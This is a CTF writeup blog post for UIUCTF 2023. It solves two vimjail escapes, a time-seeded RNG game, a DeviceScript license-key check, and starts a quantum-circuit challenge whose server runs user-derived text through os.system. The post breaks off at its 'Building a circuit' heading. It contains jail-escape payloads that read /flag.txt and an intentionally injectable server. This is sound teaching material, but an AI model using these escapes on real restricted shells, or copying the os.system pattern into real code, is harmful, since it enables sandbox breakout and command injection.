---
title: "UIUCTF 2023 Writeups"
date: 2023-07-02T21:57:50-05:00
tags: ["2023", "misc", "rev", "uiuctf"]
summary: Writeups for UIUCTF 2023, a CTF hosted by UIUC's SIGPwny. Really cool, open-ended challenges, and a fun theme.
mathjax: true
---
Once again another banger CTF from SigPwny, including a cool theme that I completely avoided to solve challenges faster. :joy::joy::joy: ~~*(jk the theme was actually cool tho)*~~

Anyway, I ended up solving quite a few challenges in misc/rev, so here's writeups for both vimjails, [geoguessr](#geoguessr-), [pwnykey](#pwnykey), and [Schrodinger's Cat](#schrödingers-cat).

# Vimjail 1 (and 1.5)
BTW, as a disclaimer, these vimjail writeups cover a solution that solves both the original and the .5 updated version, and does not cover the cheese that was patched.

Anyway, starting with Vimjail 1, we're given this setup.

filename=vimrc
```text 
set nocompatible
set insertmode

inoremap <c-o> nope
inoremap <c-l> nope
inoremap <c-z> nope
inoremap <c-\><c-n> nope
```
filename=entry.sh
```text
#!/usr/bin/env sh

vim -R -M -Z -u /home/user/vimrc
```

and our goal is to somehow read `/flag.txt`, as expected of a jail.

Connecting to remote (`socat file:$(tty),raw,echo=0 tcp:vimjail1.chal.uiuc.tf:1337`), we're greeted with an empty vim buffer, stuck in insert mode.


The usual escapes `<c-[>` (`<c-` standing for `Ctrl+`) and `Esc` don't work, and neither do any of the mapped out keybinds in the vimrc. We also can't modify the buffer, since we launched with `-M`.

After messing around a bit with random keybinds, we find that both `<c-x>` and `<c-r>` are allowed. `<c-x>`, completion mode, doesn't seem to lead anywhere interesting though, since again, the buffer is unmodifiable.

But interestingly, `<c-r>`, the registers, does actually give us something useful. The normal registers don't do anything, but we do have access to `=`, the expression register. 

The expression register allows us to input expression and it will spit out the result of the expression. For example, in normal Vim, typing `2+2` into the expression register would put `4` into the buffer.

What the expression register is actually doing is treating our input as `vimscript`, then executing it internally and returning the result. This means we basically have free `vimscript` execution, so running `system` should work right?

```text
=system("ls")
E145: Shell commands and some functionality not allowed in rvim
```

Oh right... we also launched with `-Z`

Thankfully, theres [a lot of other functions](https://vimhelp.org/usr_41.txt.html#41.6) we can use that don't trigger rvim's limitations.

We can use `readfile("/flag.txt")` to get the flag, except we don't have any way to see the actual result since it can't get pasted into the buffer. Instead, all we need to do is get an error message to pop up with the result of the `readfile`. There's a lot of ways to do this, but I ended up just using `eval`.

(also `readfile` returns a list but obviously the flag will just be in the first line so we just use `[0]`)
```text
=eval(readfile("/flag.txt")[0])
E121: Undefined variable: n0_3sc4p3_f0r_y0u_8613a322d0eb0628
Press ENTER or type command to continue
E15: Invalid expression: "uiuctf{n0_3sc4p3_f0r_y0u_8613a322d0eb0628}"
Press ENTER or type command to continue
```

This also works for vimjail 1.5.
```text
=eval(readfile("/flag.txt")[0])
E121: Undefined variable: ctr1_r_1s_h4ndy_277d0fde079f49d2
Press ENTER or type command to continue
E15: Invalid expression: "uiuctf{ctr1_r_1s_h4ndy_277d0fde079f49d2}"
Press ENTER or type command to continue
```

# Vimjail 2 (and 2.5)
This time theres a bit more limitations. In addition to the previously banned keybinds, all of the following are replaced with `_`.

```text
abcdefghijklmnoprstuvwxyz!@#$%^&*-+=`~{}[]|\;<>,./?
```

We can still access registers thankfully, but it seems we can't execute anything useful since all the built-in functions only use lowercase letters.

Except, given that `q` isn't banned, there's another trick we haven't used yet, [inserting literal characters.](https://learnbyexample.github.io/vim_reference/Insert-mode.html#insert-special-characters)

If we press `<c-q>` (`<c-v` is bound to paste) while inside the expression register, we can then type a letter like `a`.
Since we're inserting a character, the vimrc replacement doesn't apply, the `^a` gets evaluated as `a`, and we just got `a` into the expression register!

```
(in expression register)
= 
(press <c-q>)
=^
(press a)
=^a
=a
```

Unfortunately, trying to type out our entire payload like before doesn't work. Since `^x` doesn't evaluate to `x`, we can't type `/flag.txt`.

Thankfully, there's a built-in function `glob`, that can autocomplete file paths, so we can just call `glob("/flag.t*t")` to return `"/flag.txt"`.

You might think `glob` won't work either, since `^o` doesn't work, but we can actually just autocomplete `gl` to `glob` with `<c-l>` since it's a built-in function name.

So our final payload, and the flag, looks like this:
```text
=eval(readfile(glob("/flag.t*t"))[0])
E15: Invalid expression: "<left><left><left><left>_c364201e0d86171b"
Press ENTER or type command to continue
E15: Invalid expression: "uiuctf{<left><left><left><left>_c364201e0d86171b}"
Press ENTER or type command to continue
```
vimjail 2.5:
```text
=eval(readfile(glob("/flag.t*t"))[0])
E488: Trailing characters: _kn0w_h0w_7o_ex1t_v1m_7661892ec70e3550
Press ENTER or type command to continue
E15: Invalid expression: "uiuctf{1_kn0w_h0w_7o_ex1t_v1m_7661892ec70e3550}"
Press ENTER or type command to continue
```

# Geoguessr 🧀:warning:🧀:warning:🧀
:warning: This writeup contains a whole bunch of 🧀🧀🧀 :warning:

We're given two files, `janet` and `program.jimage`. Running as instructed, we're faced with a small game that seems impossible:
```text
$ ./janet -i program.jimage
Welcome to geoguesser!
Where am I? 1,1
Nope. You have 4 guesses left.
Where am I? 2,2
Nope. You have 3 guesses left.
Where am I? 3,3
Nope. You have 2 guesses left.
Where am I? 4,4
Nope. You have 1 guesses left.
Where am I? 5,5
You lose!
The answer was: <tuple 0x55BD3C9A5BC0>
```

Now, looking up online, we can see that [janet](https://janet-lang.org/) is a small functional programming language that can compile to `jimage` files. However, in it's compilation process, it actually keeps all strings and function names inside the original source code.

With a small dump we can see:
```text
$ strings program.jimage
root-env
parse-coord
source-map
main.janet
value
parse-coord
main
float
number
some
        peg/match
_000031
_000032,
(parse-coord s)
random-float
random-float
math/rng-uniform
(random-float min max)
main
main
Welcome to geoguesser!
print
init-rng
os/time
math/rng
init-rng,
guessing-game
        get-guess
Where am I?
prin
stdin
line
        file/read
"Not a valid coordinate. Try again.
        get-guess
_000033
input-line
_00003w
num,
compare-coord
compare-float
math/abs
        tolerance
compare-float,
compare-coord
_00003P,
Nope. You have
 guesses left.
answer
guessing-game
guess
        remaining
_00004I,
print-flag
flag.txt
        file/open
You win!
string/trimr
The flag is:
print-flag
        You lose!
The answer was:
(main &)
(init-rng)
*macro-lints*
(compare-float a b tolerance)
(compare-coord a b tolerance)
        precision
(guessing-game answer)
*current-file*
source
coordinate-peg
(get-guess)
(print-flag)
```

A whole lot of nonsense. The main parts of interest are:
```text
init-rng
os/time
math/rng
init-rng
```
and 
```text
random-float
random-float
math/rng-uniform
(random-float min max)
```

Since we know this is a game about guessing coordinates, we can assume it's randomly generating the latitude and longitude. 

But instead of painstakingly reversing this code, let's just reimplement what the original code would have been like.

We can assume based off the first part of interest that `math/rng` gets seeded with `os/time`.

Then, two random floats are generated, calling [`math/rng-uniform`, which generates a random number in `[0, 1)`](https://janet-lang.org/api/math.html#math/rng-uniform). The `random-float` function also seems to take in a min and a max, so logically, the most reasonable implementation would look like:
```text
random-float = math/rng-uniform # [0, 1)
random-float *= (max - min)
random-float += min
# or in one line
random-float = (math/rng-uniform) * (max - min) + min
```

Now, some quick googling tells us that latitude ranges from -90 to 90, and longitude from -180 to 180.

So all we have to do is just reimplement all this logic ourselves, run our code at the same time we connect to the remote server, and just pass in the same coords.

Here's my reimplementation in `janet` and corresponding solve script:
```text
(def gen (math/rng (os/time)))
(defn random-float [min max]
    (+ min (* (- max min) (math/rng-uniform gen)))
)

(def lat (random-float -90 90))
(def lon (random-float -180 180))
(print lat "," lon)
```
filename=solve.py
```python
import subprocess

test = subprocess.check_output(['./janet', 'test.janet'])
out = test.strip()

from pwn import remote
# nc geoguesser.chal.uiuc.tf 1337
r = remote('geoguesser.chal.uiuc.tf', 1337)
r.sendline(out)
r.interactive()
```

After a few tries and praying we get the timing right, we can get the flag.
```text
[+] Opening connection to geoguesser.chal.uiuc.tf on port 1337: Done
[*] Switching to interactive mode
== proof-of-work: disabled ==
Welcome to geoguesser!
Where am I? You win!
The flag is: uiuctf{i_se3_y0uv3_f0und_7h3_t1m3_t0_r3v_th15_b333b674c1365966}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to geoguesser.chal.uiuc.tf port 1337
```

# Pwnykey
The source is pretty small, basically just a simple web-server, so let's take a look at `app.py`:

filename=app.py
```python
#!/usr/bin/env python3
from flask import Flask, request
import threading
import subprocess
import re

app = Flask(__name__)
FLAG = open('flag.txt').read()
lock = threading.Lock()

@app.route('/')
def index():
    return app.send_static_file('index.html')

key_to_check = "00000-00000-00000-00000-00000"
key_format = re.compile(r'^[0-9A-Z]{5}-[0-9A-Z]{5}-[0-9A-Z]{5}-[0-9A-Z]{5}-[0-9A-Z]{5}$')
@app.route('/check', methods=['GET', 'POST'])
def check():
    global key_to_check
    if request.method == 'GET':
        if request.remote_addr != '127.0.0.1':
            return "Forbidden", 403
        try:
            lock.release()
        except:
            pass
        return key_to_check
    else:
        key = request.form['key']
        if not key_format.match(key):
            return "Invalid key format", 400
        lock.acquire()
        key_to_check = key
        process = subprocess.Popen(['./node_modules/@devicescript/cli/devicescript', 'run', '-t', 'keychecker.devs'], stdout=subprocess.PIPE)
        for line in iter(process.stdout.readline, b''):
            if b"success!" in line:
                process.terminate()
                return FLAG
        process.wait()
        return "Incorrect key", 400
```

Nothing too out of the ordinary, except that the `/check` POST endpoint seems to spawn a keychecker using something called `devicescript`.

A quick Google search shows that [`devicescript`](https://github.com/microsoft/devicescript) is a way for IoT devices to run native TypeScript, but more importantly, we also find that it comes with its own [disassembler](https://github.com/microsoft/devicescript/blob/main/compiler/src/disassemble.ts).

Unfortunately, trying to disassemble the `keychecker.devs` as is fails, giving some cryptic error about wrong jump target.

After a bit, my teammate managed to find a pattern (thanks vishi), that could clean up the `keychecker.devs` program and leave it in a state where it was actually disassemblable.

filename=fix_devs.py
```python
def find_all(a_string, sub):
    result = []
    k = 0
    while k < len(a_string):
        k = a_string.find(sub, k)
        if k == -1:
            return result
        else:
            result.append(k)
            #k += 1 #change to k += len(sub) to not search overlapping results
            k += len(sub)
    return result


data = open("keychecker.devs", "rb").read()
NEEDLE = bytes.fromhex("0df90007")

# find all intstances of needle
idxs = find_all(data, NEEDLE)
data_l = list(data)
for idx in idxs:
    data_l[idx + 6] = 0

open("keychecker_fixed.devs", "wb").write(bytes(data_l))
```

Now we can actually disassemble the program and figure out how to make a valid key.

## Disassembled
The full disassembly is a bit long, so I'll leave it as an unlisted pastebin [here](https://pastebin.com/qrAw4CQd). The points of interest will be shown in the writeup, with a bit of cleaning.

Anyway, starting out the disassembly is the main function:
```
proc main_F0(): @1120
  locals: loc0,loc1,loc2
   0:     CALL prototype_F1()
  10:     CALL ds."format"("start!")
  22:     CALL ds."print"(62, ret_val())
  
  34:     CALL fetch_F2("http://localhost/check")
  46:     CALL ret_val()."text"()
  57:     CALL ret_val()."trim"()
  68:     {G4} := ret_val()
  78:     CALL ds."format"("fetched key: {0}", {G4})
  92:     CALL ds."print"(62, ret_val())
```
 
The first thing it does is print `start!`, then fetches the user-submitted key from `/check`, and prints it out:
 
```
 104:     JMP 143 IF NOT ({G4}."length" !== 29)
 121:     CALL (new Error)("Invalid key")
 134:     THROW ret_val()
 
 143:     CALL {G4}."split"("-")
 157:     {G5} := ret_val()
 167:     JMP 206 IF NOT ({G5}."length" !== 5)
 184:     CALL (new Error)("Invalid key")
 197:     THROW ret_val()
 
 206:     CALL {G5}."some"(inline_F7)
 220:     JMP 254 IF NOT ret_val()
 232:     CALL (new Error)("Invalid key")
 245:     THROW ret_val()
```

Then it checks if the length of the key is 29, and splits it by `-`, and checks if there are exactly 5 split segments, each of length 5.

The `inline_F7` function just checks if each individual segment is length 5:
```
proc inline_F7(par0): @4916
   0:     RETURN (par0."length" !== 5)
```

Next, it checks that each segment passes a check called `inline_F8`:
```
 254:     CALL {G5}."some"(CLOSURE(inline_F8))
 268:     JMP 302 IF NOT ret_val()
 280:     CALL (new Error)("Invalid key")
 293:     THROW ret_val()
 302:     CALL ds."format"("key format ok")
 314:     CALL ds."print"(62, ret_val())
...
proc inline_F8(par0): @4924
   0:     CALL par0."split"("")
  14:     CALL ret_val()."some"(inline_F14)
  27:     RETURN ret_val()
...
proc inline_F14(par0): @5292
   0:     CALL "0123456789ABCDFGHJKLMNPQRSTUWXYZ"."includes"(par0)
  14:     RETURN !ret_val()
```
Following the logic, we see that each segment is split again into individual letters, then checked to see if the letters are all in the alphabet `0123456789ABCDFGHJKLMNPQRSTUWXYZ`. If any are not, it throws an error.

The next part calls `inline_F9` on each segment, which then calls `inline_F15` on each letter in each segment. `inline_F15` just returns the index of the letter in the previously established alphabet, so this entire process just maps all the letters to their respective indices:
```
 326:     CALL {G5}."map"(CLOSURE(inline_F9))
...
proc inline_F9(par0): @4956
   0:     CALL par0."split"("")
  14:     CALL ret_val()."map"(inline_F15)
  27:     RETURN ret_val()
...
proc inline_F15(par0): @5312
   0:     CALL "0123456789ABCDFGHJKLMNPQRSTUWXYZ"."indexOf"(par0)
  14:     RETURN ret_val()
  
ex: "ABCDE" -> [10, 11, 12, 13, 14]
```
 
It then stores each segment into its own variable:
```
 340:     loc0 := ret_val()
 350:     {G6} := loc0[0]
 363:     {G7} := loc0[1]
 376:     {G8} := loc0[2]
 389:     {G9} := loc0[3]
 402:     {G10} := loc0[4]
 ```
### Check 1
The next part checks `G6`:
```
 415:     CALL ds."format"("{0}", {G6})
 429:     loc0 := ret_val()

 439:     ALLOC_ARRAY initial_size=5
 448:     loc1 := ret_val()
 458:     loc1[0] := 30
 470:     loc1[1] := 10
 482:     loc1[2] := 21
 494:     loc1[3] := 29
 506:     loc1[4] := 10
 518:     CALL ds."format"("{0}", loc1)
```

It stores `G6` into `loc0`, then creates another array in `loc1`, and stores `[30, 10, 21, 29, 10]` into `loc1`. If `loc0` is not equal to `loc1`, then it prints `invalid key`, but otherwise it prints `passed check1`:
```
 518:     CALL ds."format"("{0}", loc1)
 532:     JMP 569 IF NOT (loc0 !== ret_val())
 
 547:     CALL (new Error)("Invalid key")
 560:     THROW ret_val()
 
 569:     CALL ds."format"("passed check1")
 581:     CALL ds."print"(62, ret_val())
```
So we know the first part of the key is `[30, 10, 21, 29, 10]`, which translates to `YANXA` (remember, each number is a corresponding index in the alphabet)

### Check 2
Then, `G7` and `G8` are checked at the same time:
```
 593:     CALL concat_F10({G7}, {G8})
 607:     {G11} := ret_val()
 
 617:     CALL {G11}."reduce"(inline_F11, 0)
 632:     loc0 := (ret_val() !== 134)
 645:     JMP 687 IF NOT !loc0
 
 659:     CALL {G11}."reduce"(inline_F12, 1)
 674:     loc0 := (ret_val() !== 12534912000)
 687:     JMP 722 IF NOT loc0
 
 700:     CALL (new Error)("Invalid key")
 713:     THROW ret_val()
 722:     CALL ds."format"("passed check2")
 734:     CALL ds."print"(62, ret_val())
```
They are concatenated together into `G11`, then pass two checks, `inline_F11` and `inline_F12`. Since `reduce` is called on `G11`, we know that the two inline functions must be accumulators, and they end up being sum and product respectively:
```
proc inline_F11(par0, par1): @5148
   0:     RETURN (par0 + par1)

proc inline_F12(par0, par1): @5156
   0:     RETURN (par0 * par1)
```
This means that `G11` must contain 10 numbers that add up to `134`, and have a product of `12534912000`. Of course, we can easily just solve this with `z3`:

filename=z3solve.py
```python
import z3
s = z3.Solver()

x = [z3.Int(f"x{i}") for i in range(10)]
# ten numbers add up to 134, multiply to 12534912000
s.add(sum(x) == 134)
s.add(z3.Product(x) == 12534912000)
for i in range(10):
    s.add(x[i] >= 0)
    s.add(x[i] < 32) # only 32 characters in alphabet

s.check()
m = s.model()
print(m)
nums = []
for i in range(10):
    nums.append(m[x[i]].as_long())
print(nums)
# [15, 2, 15, 5, 4, 9, 13, 16, 31, 24]
```
Since the check was done with `reduce`, the order of the numbers don't matter, so we can just translate them directly, giving us the next two sections: `YANXA-G2G54-9DHZR`

### Check 3
The next (and final) part is the most complex. First, `G9` is stored into `G12`, and `G13` is set to `1337`. Then, a loop is run 420 times, each time calling `nextInt_F13`:
```
 746:     {G12} := {G9}
 757:     {G13} := 1337
 
 770:     loc2 := 0
 780:     JMP 832 IF NOT (loc2 < 420)
 798:     CALL nextInt_F13()
 808:     loc2 := (loc2 + 1)
 821:     JMP 780
```
Looking at `nextInt_F13`, we find what seems to be a basic [`xorwow`](https://en.wikipedia.org/wiki/Xorshift#xorwow) PRNG, with `G13` serving as the counter to modify the output:
```
proc nextInt_F13(): @5164
  locals: loc0
   0:     CALL {G12}."pop"()
  12:     loc0 := ret_val()
  
  22:     loc0 := (loc0 ^ ((loc0 >> 2) & 4294967295))
  41:     loc0 := (loc0 ^ ((loc0 << 1) & 4294967295))
  60:     loc0 := (loc0 ^ (({G12}[0] ^ ({G12}[0] << 4)) & 4294967295))
  
  86:     {G13} := (({G13} + 13371337) & 4294967295
 106:     CALL {G12}."unshift"(loc0)
 120:     RETURN (loc0 + {G13})
```
This PRNG pops the last value of `G12`, does `xorshift` operations, then inserts it back into the start of `G12`. Then, at the same time, `G13` is increased by `13371337`, and only added to the final output of the PRNG.

Going back to the main function, after the loop is run, an array is created and initialized with 3 calls to `nextInt_F13`, then compared with another array:
```
 832:     ALLOC_ARRAY initial_size=3
 841:     loc0 := ret_val()
 851:     CALL nextInt_F13()
 861:     loc0[0] := ret_val()
 873:     CALL nextInt_F13()
 883:     loc0[1] := ret_val()
 895:     CALL nextInt_F13()
 905:     loc0[2] := ret_val()
 917:     CALL ds."format"("{0}", loc0)
 931:     loc0 := ret_val()
 
 941:     ALLOC_ARRAY initial_size=3
 950:     loc1 := ret_val()
 960:     loc1[0] := 2897974129
 973:     loc1[1] := -549922559
 990:     loc1[2] := -387684011
1007:     CALL ds."format"("{0}", loc1)

1021:     JMP 1058 IF NOT (loc0 !== ret_val())
1036:     CALL (new Error)("Invalid key")
1049:     THROW ret_val()

1058:     CALL ds."format"("passed check3")
1070:     CALL ds."print"(62, ret_val())
```

This means to pass this check, we need to somehow initialize `G12` with the proper state so that after 420 `nextInt` calls, we generate the exact integers `[2897974129, -549922559, -387684011]`. 

Before we start trying to solve this, another thing to realize is that `G13`, the counter, can be solved seperately from the rest of the `xorwow` PRNG. Since we know the amount of times
the PRNG is called, we can pre-calculate the value `G13` when it will be called the last 3 times, and just subtract them from the target values:

filename=calc_g13.py
```python
import ctypes
target = [2897974129, -549922559, -387684011]
g13 = 1337
for _ in range(420):
    g13 = ctypes.c_int32(g13 + 13371337).value

for i in range(3):
    g13 = ctypes.c_int32(g13 + 13371337).value
    target[i] -= g13

print(target)
# [1563607211, -1897660814, -1748793603]
```

As for solving the actual xorshift part, after a bit of mucking around with Z3 and reversing, we realized that brute force was actually feasible. This is because there are only 5 numbers in the state, and each number can only have an initial value in 0-31, since there are only 32 letters in the alphabet.

That leaves a total search space of $2^{5 \cdot 5}$ = `33554432` which is definitely small enough to brute force.

I ended up coding my brute force in c++, directly translating the logic over: 

filename=brute.cpp
```c++
#include <iostream>
#include <string>
#include <vector>

using namespace std;

vector<int> state(5);

int nextInt(){
    int last = state.back();
    state.pop_back();
    
    int nxt = last ^ (last >> 2);
    nxt = nxt ^ (nxt << 1);
    nxt = nxt ^ (state[0] ^ (state[0] << 4));
    state.insert(state.begin(), nxt);
    return nxt;
}

int main(){
    // start
    cout << time(0) << endl;
    for(int a = 0; a < 32; a++){
    for(int b = 0; b < 32; b++){
    for(int c = 0; c < 32; c++){
    for(int d = 0; d < 32; d++){
    for(int e = 0; e < 32; e++){
        state = {a, b, c, d, e};
        for(int i = 0; i < 420; i++){
            nextInt();
        }
        // 1563607211, -1897660814, -1748793603
        int tmp = nextInt();
        if(tmp == 1563607211){
            tmp = nextInt();
            if(tmp == -1897660814){
                tmp = nextInt();
                if (tmp == -1748793603){
                    cout << "found! " << a << " " << b << " " << c << " " << d << " " << e << endl;
                    cout << time(0) << endl;
                    return 0;
                }
            }
        }
    }
    }
    }
    }
    }
    cout << time(0) << endl;
    return 1;
}
```

Even though the code is kinda ugly and unoptimized, compiling with `-O3` and letting it run only took ~60 seconds to finish and spit out a valid answer:
```
$ g++ -o brute -O3 'brute.cpp'
$ ./brute
1688339552
found! 14 11 22 2 27
1688339618
```

### Finale
Now our key is looking like `YANXA-G2G54-9DHZR-FBP2U`. But what about the last part? Well going back to the disassembly, we see that after passing the 3rd check, the last segment isn't used at all. Instead, after passing check 3, the program just prints `success!` and exits:
```
1058:     CALL ds."format"("passed check3")
1070:     CALL ds."print"(62, ret_val())
1082:     CALL ds."format"("success!")
1094:     CALL ds."print"(62, ret_val())
1106:     RETURN 0
```

This means we can do anything for the last 5 digits, so of course, our key is now: 
```YANXA-G2G54-9DHZR-FBP2U-XDUWU```

Passing this to the website, we're finally *finally* able to get our proper PwnyOS license! Oh, and the flag too
```
uiuctf{abbe62185750af9c2e19e2f2}
```

# Schrödinger's Cat
Finally, we're at the last challenge. This one is a bit different from the rest, and involves constructing a quantum circuit to solve a problem. Don't worry though, this writeup assumes no prior knowledge of quantum computing, and will explain everything you need to know.

First, let's take a look at the provided file:

filename=server.py
```python
#!/usr/bin/env python3

from os import system
from base64 import b64decode
import numpy as np

from qiskit import QuantumCircuit
import qiskit.quantum_info as qi
from qiskit.circuit.library import StatePreparation

WIRES = 5


def normalization(msg):
    assert(len(msg) <= WIRES**2)
    state = np.array([ord(c) for c in msg.ljust(2**WIRES, ' ')])
    norm = np.linalg.norm(state)
    state = state / norm
    return (state, norm)

def transform(sv, n):
    legal = lambda c: ord(' ') <= c and c <= ord('~')
    renormalized = [float(i.real)*n for i in sv]
    rn_rounded = [round(i) for i in renormalized]
    if not np.allclose(renormalized, rn_rounded, rtol=0, atol=1e-2):
        print("Your rehydrated statevector isn't very precise. Try adding at least 6 decimal places of precision, or contact the challenge author if you think this is a mistake.")
        print(rn_rounded)
        exit(0)
    if np.any([not legal(c) for c in rn_rounded]):
        print("Invalid ASCII characters.")
        exit(0)
    return ''.join([chr(n) for n in rn_rounded])

def make_circ(sv, circ):
    qc = QuantumCircuit(WIRES)
    qc.append(circ.to_instruction(), range(WIRES))
    sp = QuantumCircuit(WIRES, name="echo 'Hello, world!'")
    sp.append(StatePreparation(sv), range(WIRES))
    qc.append(sp.to_instruction(), range(WIRES))
    return qc

def print_given(sv, n):
    placeholder = QuantumCircuit(WIRES, name="Your Circ Here")
    placeholder.i(0)

    circ = make_circ(sv, placeholder)
    print(circ.draw(style={
        "displaytext": {
            "state_preparation": "<>"
            }
        }))
    new_sv = qi.Statevector.from_instruction(circ)
    print(f'Normalization constant: {n}')
    print("\nExecuting...\n")
    system(transform(new_sv, n))

def main():
    print("Welcome to the Quantum Secure Shell. Instead of dealing with pesky encryption, just embed your commands into our quantum computer! I batched the next command in with yours, hope you're ok with that!")

    given_sv, given_n = normalization("echo 'Hello, world!'")
    print_given(given_sv, given_n)

    try:
        qasm_str = b64decode(input("\nPlease type your OpenQASM circuit as a base64 encoded string: ")).decode()
    except:
        print("Error decoding b64!")
        exit(0)
    try:
        circ = QuantumCircuit.from_qasm_str(qasm_str)
        circ.remove_final_measurements(inplace=True)
    except:
        print("Error processing OpenQASM file! Try decomposing your circuit into basis gates using `transpile`.")
        exit(0)
    if circ.num_qubits != WIRES:
        print(f"Your quantum circuit acts on {circ.num_qubits} instead of {WIRES} qubits!")
        exit(0)

    try:
        norm = float(input("Please enter your normalization constant (precision matters!): "))
    except:
        print("Error processing normalization constant!")
        exit(0)
    try:
        sv_circ = make_circ(given_sv, circ)
    except:
        print("Circuit runtime error!")
        exit(0)

    print(sv_circ.draw())
    command = transform(qi.Statevector.from_instruction(sv_circ), norm)

    print("\nExecuting...\n")
    system(command)

if __name__ == "__main__":
    main()
```

It might look like a lot, so I'll break it down step by step.

First, the server prints a welcome message, then executes its built-in quantum circuit and prints out its result:
```python
def main():
    print("Welcome to the Quantum Secure Shell. Instead of dealing with pesky encryption, just embed your commands into our quantum computer! I batched the next command in with yours, hope you're ok with that!")

    given_sv, given_n = normalization("echo 'Hello, world!'")
    print_given(given_sv, given_n)
```
The specific implementation of `normalization` and `print_given` aren't important yet, but just know that `normalization` returns a statevector and a normalization constant while `print_given` just executes and prints out a fixed quantum circuit.

A [statevector](https://en.wikipedia.org/wiki/Quantum_state) is way to represent the possible states of a collection of qubits, and records the probabilities of every possible combination of qubit measurements. Qubits, like classical bits, can be in one of two states, 0 or 1, but unlike classical bits, they don't have to be in one state or the other. Instead, they can be in a superposition of both states, and the statevector records the probability of measuring the qubits in each state. 

For example, the two simplest statevectors are the zero and one position that always collapse to 0 and 1 respectively, and they look like:

$$|0\rangle = \begin{bmatrix}
    1 \\\\ 0
\end{bmatrix}$$

$$|1\rangle = \begin{bmatrix}
    0 \\\\ 1
\end{bmatrix}$$

On the other hand, a statevector of a qubit with an equal chance of being measured as 0 or 1 would look like:

$$|+\rangle = \begin{bmatrix}
    \frac{1}{\sqrt{2}} \\\\ \frac{1}{\sqrt{2}}
\end{bmatrix}$$

A key property of statevectors is that the sum of the squares of all values in the statevector must equal 1. This is called normalization, and the normalization constant is what the statevector is divided by to ensure it is normalized. In the above example, each value in the state vector is $\frac{1}{\sqrt{2}}$ rather than $\frac{1}{2}$ because $(\frac{1}{\sqrt{2}})^2 + (\frac{1}{\sqrt{2}})^2 = 1$.

A statevector that records $n$ qubits requires $2^n$ values. In this case, the statevector is 32 values long, and represents the 5 qubits used in the circuit. In the output of `print_given`, we can also see that the normalization constant is `419.1873089681986`.

Additionally `print_given` seems to execute the result of the its fixed quantum circuit with `os.system`. Since we know the statevector that gets passed in is created from `echo 'Hello, world!'`, we can assume the output of `system` is the result of executing `echo 'Hello, world!'`:
```python
def print_given(sv, n): # sv is the statevector from normalization("echo 'Hello, world!'")
    placeholder = QuantumCircuit(WIRES, name="Your Circ Here")
    placeholder.i(0)

    circ = make_circ(sv, placeholder)
    print(circ.draw(style={
        "displaytext": {
            "state_preparation": "<>"
            }
        }))
    new_sv = qi.Statevector.from_instruction(circ)
    print(f'Normalization constant: {n}')
    print("\nExecuting...\n")
    # transform just turns the statevector back into ASCII by multiplying each value by the normalization constant and rounding to the nearest integer
    system(transform(new_sv, n))
```

Connecting to the remote server, we can confirm this for ourselves:
```text
== proof-of-work: disabled ==
$ nc schrodingers-cat.chal.uiuc.tf 1337
Welcome to the Quantum Secure Shell. Instead of dealing with pesky encryption, just embed your commands into our quantum computer! I batched the next command in with yours, hope you're ok with that!
     ┌─────────────────┐┌───────────────────────┐
q_0: ┤0                ├┤0                      ├
     │                 ││                       │
q_1: ┤1                ├┤1                      ├
     │                 ││                       │
q_2: ┤2 Your Circ Here ├┤2 echo 'Hello, world!' ├
     │                 ││                       │
q_3: ┤3                ├┤3                      ├
     │                 ││                       │
q_4: ┤4                ├┤4                      ├
     └─────────────────┘└───────────────────────┘
Normalization constant: 419.1873089681986

Executing...

Hello, world!

Please type your OpenQASM circuit as a base64 encoded string: 
```

From the server output, it seems we need to construct our own quantum circuit that gets prepended before the `echo 'Hello, world!'` circuit. Then, after the server executes the entire circuit, the result gets passed into `system`. Since this is a CTF challenge, we probably want to read `/flag.txt` or something similar.

Now continuing down `main`, we see that it takes in a quantum circuit as a base64 string, decodes it to a quantum circuit object, then checks to make sure it only operates on 5 qubits like the given circuit:
```python
try:
    qasm_str = b64decode(input("\nPlease type your OpenQASM circuit as a base64 encoded string: ")).decode()
except:
    print("Error decoding b64!")
    exit(0)
try:
    circ = QuantumCircuit.from_qasm_str(qasm_str)
    circ.remove_final_measurements(inplace=True)
except:
    print("Error processing OpenQASM file! Try decomposing your circuit into basis gates using `transpile`.")
    exit(0)
if circ.num_qubits != WIRES: # constant set to 5
    print(f"Your quantum circuit acts on {circ.num_qubits} instead of {WIRES} qubits!")
    exit(0)
```

The [`from_qasm_str`](https://qiskit.org/documentation/stubs/qiskit.circuit.QuantumCircuit.from_qasm_str.html#qiskit.circuit.QuantumCircuit.from_qasm_str) function populates a Qiskit QuantumCircuit object from a specified OpenQASM string, and [`remove_final_measurements`](https://qiskit.org/documentation/stubs/qiskit.circuit.QuantumCircuit.remove_final_measurements.html#qiskit.circuit.QuantumCircuit.remove_final_measurements) removes any measurements from the circuit. This is because the server will be executing the statevector of the circuit, so any measurements will collapse the statevector and make it useless.

Next, the server reads in a normalization constant that we control. From before, we know this number comes from dividing the statevector from ASCII values to a normalized vector.
It then forms the complete circuit by prepending our input to the given circuit:
```python
try:
    norm = float(input("Please enter your normalization constant (precision matters!): "))
except:
    print("Error processing normalization constant!")
    exit(0)
try:
    sv_circ = make_circ(given_sv, circ)
except:
    print("Circuit runtime error!")
    exit(0)
```

Finally, at the very end, the server calculates the final statevector from the entire circuit, transforms it uses our normalization constant, and executes it using `system`.
```python
print(sv_circ.draw())
command = transform(qi.Statevector.from_instruction(sv_circ), norm)

print("\nExecuting...\n")
system(command)
```

From here, there's a lot of ways we can begin approaching the problem. But first, let's take one final look at a function from the server:
```python
def transform(sv, n):
    legal = lambda c: ord(' ') <= c and c <= ord('~')
    renormalized = [float(i.real)*n for i in sv]
    rn_rounded = [round(i) for i in renormalized]
    if not np.allclose(renormalized, rn_rounded, rtol=0, atol=1e-2):
        print("Your rehydrated statevector isn't very precise. Try adding at least 6 decimal places of precision, or contact the challenge author if you think this is a mistake.")
        print(rn_rounded)
        exit(0)
    if np.any([not legal(c) for c in rn_rounded]):
        print("Invalid ASCII characters.")
        exit(0)
    return ''.join([chr(n) for n in rn_rounded])
```

This is the function that takes the statevector and converts it back into ASCII to be executed. Note that the `np.allclose` means our multiplied statevector must be almost exactly equal to ASCII values, as the tolerance is only `1e-2`. 

This means we need to be very precise with our normalization constant. Additionally, the normalization only uses the real component of the statevector. Typically, quantum statevectors include both real and imaginary components, so it's good to know that only the real component matters here (but it isn't too important).

## Building a circuit
First, before we do any actual solving, let's try and actually send a valid quantum circuit. I'll be using `qiskit` here, since it's what the server uses and is the simplest.
